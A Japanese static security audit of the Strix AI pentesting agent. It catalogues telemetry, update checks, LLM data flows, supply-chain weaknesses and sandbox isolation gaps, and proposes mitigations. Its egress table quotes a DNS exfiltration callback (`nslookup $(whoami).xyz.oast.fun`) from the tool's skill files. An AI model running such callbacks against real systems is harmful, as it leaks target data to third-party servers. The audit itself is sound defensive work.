# Strix 安全性監査メモ（段階0）

- 対象: `ms2sato/strix` @ `972f509`（upstream `usestrix/strix` main 相当、`strix-agent` 1.7.0）
- 日付: 2026-10-17
- 方法: **静的読解のみ**。コードの実行・インストール・ビルド・イメージ pull は一切していない。
- 観点: 外部への情報送信 / テレメトリ / phone-home / バックドア / サプライチェーン

## 0. 結論（要約）

- **バックドアや隠れた送信は見つからなかった。** 外部送信はすべてソース上に明示されており、送信内容もコードと一致する（README の主張と実装に食い違いなし）。
- ただし **既定のまま動かすと外へ出る経路が多い**:
  1. テレメトリ（PostHog + Scarf）が **既定 ON**（`STRIX_TELEMETRY=0` で両方止まる）。
  2. 更新チェック（PyPI / GitHub API）が **既定 ON**（`STRIX_NO_UPDATE_CHECK=1` で止まる）。対話モードでは更新を促し、`y` で自己更新・`pip install --upgrade` を実行する。
  3. **LLM プロバイダへ、検査対象のソースコード・HTTP 応答・発見事項がすべて送られる**（仕組み上不可避。最大のデータ流出経路）。
  4. サンドボックスは **既定ブリッジ（外向き無制限）+ `host.docker.internal`→host-gateway + NET_ADMIN/NET_RAW + NOPASSWD sudo**。エージェントはインターネットにもホストにも到達できる。
  5. ローカルソースは **読み書き可能で bind mount** される（`.git` 等のメタデータだけ読み取り専用）。
- サプライチェーン面では、`install.sh`（署名検証なし・`latest` 取得・既存バイナリ削除）とサンドボックスの `Dockerfile`（`@latest` / `curl | sh` / `kali-rolling:latest`）が弱い。Python 依存は `uv.lock` でハッシュ固定されており、既知侵害版は含まれない。

## 1. 外部送信の一覧（何が・どこへ・いつ）

危険度: **高** = 機微データが出る or 任意コード実行に直結 / **中** = メタデータの送信・改ざん入力になり得る / **低** = 利用者操作が必要で内容も限定的

| # | 何が | どこへ | いつ（発火条件） | 既定 | 危険度 | 根拠 | 実行せずに塞げるか |
|---|---|---|---|---|---|---|---|
| 1 | プロンプト全体（対象ソース、ツール出力、HTTP 応答、発見事項） | `STRIX_LLM` のプロバイダ（`LLM_API_BASE` / LiteLLM 経由） | スキャン中ずっと + 起動時プリフライト | 必須 | **高** | `strix/interface/main.py:111`（`warm_up_llm`）、`strix/config/models.py:704-721` | 不可（本質）。プロバイダ選択・ダミーデータ化・egress allowlist で管理 |
| 2 | イベント `scan_started` / `finding_reported` / `scan_ended` / `error` / viewer 系。OS・arch・Python・版、モデル名、scan mode、重大度別件数、CWE、トークン数・コスト、LLM プロバイダ別集計、使用 skill 名、例外クラス名、ランダム session ID | `https://us.i.posthog.com/capture/`（公開 API キー直書き） | スキャン開始・発見ごと・終了・エラー時 | **ON** | 中 | `strix/telemetry/posthog.py:25-26,29-56,59-147,185-193`、`strix/config/settings.py:165`、`strix/interface/main.py:418,537` | 可: `STRIX_TELEMETRY=0`（`_is_enabled()` で全送信が止まる） |
| 3 | 上と同じ内容を URL クエリで | `https://strix.gateway.scarf.sh/<event>/<version>?...` | 同上 | **ON** | 中 | `strix/telemetry/scarf.py:29,32-57`、`strix/telemetry/__init__.py:5-11` | 可: `STRIX_TELEMETRY=0` |
| 4 | 最新版の問い合わせ（送信内容は IP / UA のみ） | `https://pypi.org/pypi/strix-agent/json`（バイナリ版は `api.github.com/.../releases/latest`） | CLI 起動ごと（24h キャッシュ） | **ON** | 中（下記 #5 の起点） | `strix/interface/update_check.py:48-52,97-116,178-188`、`main.py:477` | 可: `STRIX_NO_UPDATE_CHECK=1`（`CI` 等の変数でも止まる） |
| 5 | **自己更新**: GitHub Releases からバイナリを取得して置換、または `pip/pipx/uv upgrade strix-agent` を実行 | github.com / PyPI | 対話モードで新版があり、利用者が `y` を選んだとき。`strix --update` | 利用者操作 | **高**（未検証コードの取得・実行） | `update_check.py:238-264,315-376`、`main.py:478-481` | 可: `STRIX_NO_UPDATE_CHECK=1` + `-n`（headless は prompt しない）。digest 検証は同じ GitHub API から取るため真正性の保証にならない（`:119-135,337-346`） |
| 6 | URL ターゲットの git 判定プローブ（`GET <target>/info/refs?service=git-upload-pack`） | **検査対象そのもの（ホストから直接、サンドボックス外）** | ターゲット種別推定時（URL がリポジトリ風のとき） | 自動 | 中（サンドボックスの隔離を迂回） | `strix/interface/utils.py:1122-1130,1172,1206` | 部分的: lab 内ホスト名のみ指定。ホスト側 egress 制御が必要 |
| 7 | 対象リポジトリの `git clone` | 指定 URL | リポジトリ URL をターゲットにしたとき（ホストで実行） | 利用者指定 | 低〜中 | `strix/interface/utils.py:1555-1590` | 可: ローカルパスをターゲットにする |
| 8 | サンドボックスイメージ pull | `ghcr.io/usestrix/strix-sandbox:1.3.0`（タグ指定、digest なし） | イメージが手元に無いとき（起動時とコンテナ作成時の 2 箇所） | 自動 | **高**（タグは差し替え可能） | `strix/config/settings.py:153-156`、`strix/interface/environment.py:191-218`、`strix/runtime/docker_client.py:179-181` | 可: 事前に digest で pull し `STRIX_IMAGE=...@sha256:...` |
| 9 | Web 検索クエリ（LLM が生成。対象情報を含み得る） | `api.perplexity.ai` / `api.exa.ai`（ホストから） | `PERPLEXITY_API_KEY` / `EXA_API_KEY` があるときのみツール有効 | OFF | 中 | `strix/tools/web_search/tool.py:49-146,169-246` | 可: キーを設定しない |
| 10 | Postman コレクション取得（API キー送信） | `api.getpostman.com` | `postman://` ターゲット + `POSTMAN_API_KEY` | OFF | 低 | `strix/utils/api_spec.py:234-300` | 可: 使わない |
| 11 | MCP サーバ接続（stdio 起動 or HTTP） | `~/.strix/mcp-servers.json` / `STRIX_MCP_CONFIG` に書いた先 | 設定ファイルがあるとき自動 | ファイル無しなら OFF | 中（任意コマンド起動） | `strix/tools/mcp/loader.py:30-43`、`strix/tools/mcp/client.py:124-175` | 可: ファイルを置かない |
| 12 | **暗号化 PDF レポート + 対象名 + run 名 + メール/トークン**、フィードバック本文 | `STRIX_APP_URL`（既定 `https://app.strix.ai/api/oss/...`） | `strix view` / TUI の viewer で、メール認証してから「送信」を押したとき | 利用者操作 | 中（**対象名は平文**） | `strix/interface/viewer/auth.py:136-248`、`strix/interface/viewer/server.py:360-392`、`settings.py:212` | 可: viewer を使わない / `STRIX_APP_URL=http://127.0.0.1:9`（無効化先） |
| 13 | `strix cloud ...` 全般（**ソースアーカイブのアップロード**を含む）、ログイン | `app.strix.ai` | `strix cloud` サブコマンド実行時のみ | 利用者操作 | 高（ソース送信）だが明示操作 | `strix/interface/main.py:465-470`、`strix/interface/cloud/*` | 可: 使わない |
| 14 | `npx mppx@0.8.17` / `npx @stripe/link-cli@0.13.1` の取得・実行 | registry.npmjs.org | `strix cloud billing topup` のみ | 利用者操作 | 中 | `strix/interface/cloud/billing.py:34-52,285-345` | 可: 使わない |
| 15 | ChatGPT サブスク OAuth | `auth.openai.com` / `chatgpt.com/backend-api/codex` | `strix auth` と Codex モデル選択時のみ | 利用者操作 | 低 | `strix/config/codex.py` | 可: API キー方式を使う |
| 16 | LiteLLM のモデル価格表のリモート取得（**Strix のコード外。LiteLLM の既知挙動、要実機確認**） | `raw.githubusercontent.com/BerriAI/litellm/...` | `import litellm` 時 | ON（推定） | 中（取得内容がコスト計算・上限判定に使われる） | Strix は `LITELLM_LOCAL_MODEL_COST_MAP` を設定していない（grep で該当なし） | 可: `LITELLM_LOCAL_MODEL_COST_MAP=True` |
| 17 | OpenAI Agents SDK のトレース送信 | （platform.openai.com） | — | **OFF** | — | `strix/config/models.py:707`（`set_tracing_disabled(True)`） | 対処済み |
| 18 | LiteLLM のメッセージログ | — | — | **OFF** | — | `strix/config/models.py:777-783`（`turn_off_message_logging = True`） | 対処済み |

### サンドボックス（コンテナ）内から出ていく通信

エージェントが sudo 付きシェルを持つため「何でも出ていける」が前提。そのうえで、ツールや skill が**既定で**外へ出るもの:

| 何が | どこへ | 根拠 | 危険度 |
|---|---|---|---|
| OAST コールバック（**対象から抜いた値を DNS/HTTP で埋め込む例あり**: `nslookup $(whoami).xyz.oast.fun`） | 公開 interactsh サーバ `*.oast.fun` | `strix/skills/vulnerabilities/rce.md:44-55`、`ssrf.md:126`、`xxe.md:52`、`strix/agents/prompts/system_prompt.jinja:461` | **高**（第三者サーバへ対象データ） |
| nuclei の interactsh（`-ni` を付けない限り） | 公開 interactsh | `strix/skills/tooling/nuclei.md:24,53` | 中 |
| semgrep の `p/...` ルール取得（`--metrics=off` は付与済み） | semgrep.dev | `strix/skills/tooling/semgrep.md:35-49` | 低 |
| trivy / govulncheck / vulnx / nuclei テンプレート / trufflehog 自己更新 | 各配布元 | `strix/skills/custom/dependency_cve_scanning.md:35-132`、`containers/Dockerfile:174-181` | 低〜中 |
| Chromium（agent-browser）の Google サービス通信 | Google | `containers/Dockerfile:116-118`（`--no-first-run` のみ） | 低 |
| Caido CLI 自身の通信（**要実機確認**） | caido.io 等 | `containers/docker-entrypoint.sh:40-46` | 不明 |

## 2. 項目別の所見

### 2.1 `scripts/install.sh`

| 所見 | 根拠 | 危険度 |
|---|---|---|
| 版を未指定だと GitHub API の `releases/latest` を採用 | `scripts/install.sh:76-84` | 中 |
| ダウンロードしたアーカイブの **チェックサム・署名検証なし**（HTTPS のみ） | `:154-169` | **高** |
| `which -a strix` で見つかった **他の strix を `rm -f`**（`~/.local/bin` なら `pipx uninstall`）。同名の別ツールも消える | `:102-130`、`:292-309` | 中（破壊的） |
| シェル rc（`.bashrc` / `.zshrc` / 場合により `/etc/profile`）に PATH を追記 | `:209-290` | 低 |
| サンドボックスイメージをタグ指定で `docker pull` | `:7,194-205` | 中 |
| リリースバイナリは PyInstaller 製で、CI に署名・provenance（attestation / cosign）なし | `.github/workflows/build-release.yml`（`attest`/`cosign` なし。actions 自体は SHA 固定で良好） | 中 |

→ **使わない**。PyPI 版も CI に publish 工程が無く（`build-release.yml` は GitHub Release のみ）、ビルド元を辿れない。さらに wheel にはプリビルドの Go TUI バイナリが同梱される（`scripts/tui_sidecar_hook.py:22-58`）。**本 fork のソース + `uv.lock` から入れる**のが最も検証可能。

### 2.2 Python 依存（`pyproject.toml` / `uv.lock`）

- `uv.lock`: 120 パッケージ、取得元はすべて `https://pypi.org/simple`、各配布物に sha256 あり。git 依存・直 URL 依存なし。
- **litellm は 1.101.0 に固定**（`uv.lock:1081-1082`）。2026-03 に PyPI で侵害された 1.82.7 / 1.82.8 ではない。ただし `pyproject.toml:38` は `litellm>=1.101.0`（上限なし）なので、**`pip install strix-agent` だとロックを無視して最新の litellm が入る**。必ず `uv sync --frozen` を使う。
- 他の主要依存（`openai` 2.53.0、`openai-agents` 0.19.0、`cryptography` 48.0.1、`docker` 7.1.0、`requests` 2.34.2、`caido-sdk-client` 0.2.0）に不審点なし。名前の紛らわしい（typosquat 風の）パッケージなし。
- Python パッケージに postinstall の仕組みは無い。ビルド時フックは `scripts/tui_sidecar_hook.py`（`go build` を実行）だけで、**editable install では何もしない**（`:25-26`）。
- 注意: ビルドバックエンド `hatchling` は `[build-system] requires = ["hatchling"]`（`pyproject.toml:76-78`）で版固定なし。プロジェクト自身を install する際に最新の hatchling を取得する → `--no-install-project` で回避できる（safe-notes 参照）。
- Go TUI（`strix/interface/tui/go.mod`）は charmbracelet 系の定番のみ。headless（`-n`）では使わない。

### 2.3 コード内の外部送信

§1 の表のとおり。補足:

- **設定の永続化**: スキャンごとに `persist_current()` が、設定されている環境変数（`LLM_API_KEY` を含む）を `~/.strix/cli-config.json`（0600）へ平文で書く（`strix/config/loader.py:64-91`、`strix/interface/main.py:411`）。`--config <file>` で書き先を変えられる（`strix/interface/cli_args.py:247,327`）。
- viewer はローカル（既定 127.0.0.1）で動き、セッショントークンで保護されている（`strix/interface/viewer/server.py:134-141`）。外部送信は #12 のボタン操作時のみ。
- OpenRouter 利用時は `HTTP-Referer: https://strix.ai` / `X-Title: Strix` を付ける（`strix/config/models.py:884-885`）。帰属表示であり情報流出ではない。
- **難読化コード・eval/exec・base64 で隠した URL などのバックドア的な構造は見当たらない**（外向き HTTP を行うモジュールは 13 個で、すべて §1 に対応づけた）。

### 2.4 `containers/Dockerfile`（サンドボックスイメージ）

| 所見 | 根拠 | 危険度 |
|---|---|---|
| ベースが `kalilinux/kali-rolling:latest`（2 箇所）、`apt-get upgrade -y` → 再現性なし | `:6,25,29-32` | 中 |
| Go ツールを **`@latest`** で `go install`（httpx, katana, vulnx, gospider, interactsh-client, govulncheck） | `:15-20` | **高** |
| `curl ... astral.sh/uv/install.sh \| sh`、trufflehog の install.sh を **`main` ブランチから** `\| sh`、trivy の install.sh を **`main` から** `\| sh`（trivy は 2026-03 に配布物侵害の前例あり） | `:88,180,195` | **高** |
| gitleaks を GitHub API の `latest` で取得（検証なし） | `:189-193` | 中 |
| npm グローバルに `@latest`（retire, eslint, js-beautify, @ast-grep/cli, tree-sitter-cli）、`jshint` は版なし。`ignore-scripts` なし | `:106-111,204` | **高** |
| `git clone` で第三者リポジトリ（JS-Snooper, jsniper.sh, jwt_tool, tree-sitter 各種）を HEAD のまま取得し、jwt_tool の requirements を pip install | `:137-170,247` | 中 |
| pipx で arjun / dirsearch / wafw00f / semgrep / bandit を版なしで導入 | `:98-101,201-202` | 中 |
| caido-cli は版固定（0.56.0）だが **ハッシュ検証なし** | `:222-235` | 中 |
| `pentester ALL=(ALL) NOPASSWD:ALL` → コンテナ内で実質 root | `:34-37` | 中（コンテナ境界が前提） |
| 自己署名 CA の **秘密鍵をビルド時に生成してイメージに残置**（`/app/certs/ca.key`, `ca.p12` はパスワード空）。公開イメージを pull した全員が同じ CA 鍵を持つ。コンテナ内でのみ信頼されるため、**ホストの trust store に入れない限り**影響はコンテナ内に限られる | `:67-86`、`containers/docker-entrypoint.sh:46,121-123` | 中 |
| `nmap` に `cap_net_raw,cap_net_admin` の file capability | `:64` | 低 |
| entrypoint が Caido を `0.0.0.0:48080 --allow-guests` で起動 | `containers/docker-entrypoint.sh:40-46` | 中（下記 2.5） |

→ 上流イメージ `ghcr.io/usestrix/strix-sandbox:1.3.0` は **上記の非決定的ビルドの産物**で、このリポジトリの CI にもイメージのビルド・push 工程が無い（provenance を辿れない）。**digest 固定で中身を凍結する**か、**自前で版固定ビルドする**かの判断が要る（safe-notes §2）。

### 2.5 実行時の外向き（`strix/runtime/`）

| 所見 | 根拠 | 危険度 |
|---|---|---|
| ネットワーク未指定 → Docker 既定ブリッジ（**インターネットへ無制限**） | `strix/runtime/docker_client.py:57-66`（`STRIX_DOCKER_SANDBOX_NETWORK` 未設定時は何もしない） | **高** |
| `extra_hosts: host.docker.internal → host-gateway` を常に付与 → **ホストのサービスへ到達可能**。さらに `localhost` / `127.x` のターゲットは `host.docker.internal` に自動で書き換えられる | `docker_client.py:232-233`、`strix/interface/scan_setup.py:53,208`、`strix/interface/utils.py:1458-1501` | **高** |
| `cap_add: NET_ADMIN, NET_RAW` を常に付与（+ NOPASSWD sudo）→ コンテナ内の iptables / ルート / ARP を操作できる。**隔離はコンテナの外（Docker ネットワーク / ホストの firewall）で強制する必要がある** | `docker_client.py:224-230` | 中 |
| Docker ソケットのマウント: **なし**（`docker.sock` の参照は skill 文書のみ） | grep 結果 | — |
| `privileged` なし。`SYS_ADMIN` + `apparmor:unconfined` は manifest が FUSE 等を要求したときだけ（Strix の manifest は bind mount のみで該当しない見込み） | `docker_client.py:204-216` | 低 |
| ローカルソースは **読み書き可能**で bind mount（`read_only` を True にする経路がコード上に無い）。`.git` 等のメタデータのみ読み取り専用。コンテナの uid はホスト uid に合わせられる → **エージェントがホスト上のソースを書き換え得る** | `strix/interface/utils.py:1320-1327`、`strix/runtime/session_manager.py:69-82,226-245`、`containers/docker-entrypoint.sh:1-15` | 中 |
| Caido ポートは既定で `127.0.0.1` のみに公開。**`STRIX_DOCKER_SANDBOX_NETWORK` 指定時は公開を外し、CLI はコンテナ IP:48080 に直接つなぐ** → 同じネットワークの他コンテナ（検査対象を含む）からも Caido（guest 許可）に到達できる | `docker_client.py:62-66,127-160,217-221` | 中 |
| LLM キー等はコンテナの環境変数に**渡していない**（渡すのは proxy 設定・UID/GID・`HOST_GATEWAY` のみ） | `strix/runtime/session_manager.py:316-330` | 良好 |
| CLI プロセス（LLM 呼び出し・テレメトリ・更新確認・#6 プローブ）は **ホスト上で動く**。サンドボックスをどう隔離しても、これらはホストのネットワークから出る | 構造 | **高**（隔離設計に影響） |

## 3. 実行せずに塞げる点 / 隔離が要る点

### 3.1 設定だけで塞げる（コード変更なし）

| 対象 | 方法 |
|---|---|
| テレメトリ（#2, #3） | `STRIX_TELEMETRY=0` |
| 更新チェック・自己更新（#4, #5） | `STRIX_NO_UPDATE_CHECK=1` + 常に `-n` |
| LiteLLM 価格表取得（#16） | `LITELLM_LOCAL_MODEL_COST_MAP=True` |
| viewer の中継（#12） | viewer を使わない。保険で `STRIX_APP_URL=http://127.0.0.1:9` |
| Web 検索 / Postman / MCP（#9–11） | 該当キー・`~/.strix/mcp-servers.json` を置かない |
| cloud / billing / auth（#13–15） | サブコマンドを使わない |
| イメージ差し替え（#8） | `STRIX_IMAGE=ghcr.io/usestrix/strix-sandbox@sha256:<digest>` を事前 pull |
| `install.sh`・PyPI wheel・依存の浮動 | 本 fork のソースから `uv sync --frozen --no-dev --no-install-project` |
| LLM キーの平文永続化 | `--config <lab 専用ファイル>` で書き先を lab ディレクトリに限定（または後述のコード変更） |

### 3.2 コード変更で塞ぐのが望ましい（fork で小さく直せる）

| 対象 | 案 |
|---|---|
| テレメトリ・更新チェックの既定 ON | fork で既定を OFF に反転（`settings.py:165`、`update_check.py:48`） |
| `host.docker.internal` の常時付与 | 環境変数で無効化できるようにする（`docker_client.py:232-233`） |
| ソースの RW マウント | `read_only` を指定できるようにする（既定 RO を推奨） |
| URL プローブ（#6） | 隔離時は無効化 |
| OAST の公開サーバ利用 | skill / prompt から外すか、lab 内の自前 interactsh を指す |
| `persist_current()` によるキー保存 | `LLM_API_KEY` を永続化対象から外す |

### 3.3 ネットワーク隔離が必須（設定では塞げない）

- **#1 LLM 通信**: 宛先を allowlist（LLM API のドメインだけ）に限定する egress プロキシ経由にする。
- **サンドボックスのインターネット / ホスト到達**: `internal: true` の Docker ネットワークに置く（NET_ADMIN + sudo があるので、コンテナ内の設定に頼らない）。
- **ホスト側 CLI の通信**（#1, #6、塞ぎ損ねたテレメトリ等）: ホスト上で動く限りネットワークで強制できない。CLI を専用 netns / コンテナに入れるか、専用ユーザー + nftables の owner match で egress を絞る（safe-notes §3）。
- **サンドボックス内ツールの外向き**（OAST、テンプレート更新など）: internal ネットワークで一律に遮断される。

## 4. 未確認事項（実機での観測が必要）

1. LiteLLM 1.101.0 が import 時に価格表を取りに行くか、ほかに通信するか。
2. caido-cli 0.56.0 が guest モードで外部（caido.io 等）に通信するか。
3. Docker Engine（ホストの版）で、ホスト上のプロセスから `internal: true` ネットワーク上のコンテナ IP に到達できるか（Strix CLI は Caido にコンテナ IP で直接つなぐため必須）。
4. `ghcr.io/usestrix/strix-sandbox:1.3.0` の digest と、中身（SBOM、`/app/certs/ca.key` の存在）。
5. 初回起動時に全通信を遮断した状態で、何がどこへ出ようとするか（tcpdump / squid ログで確認）。
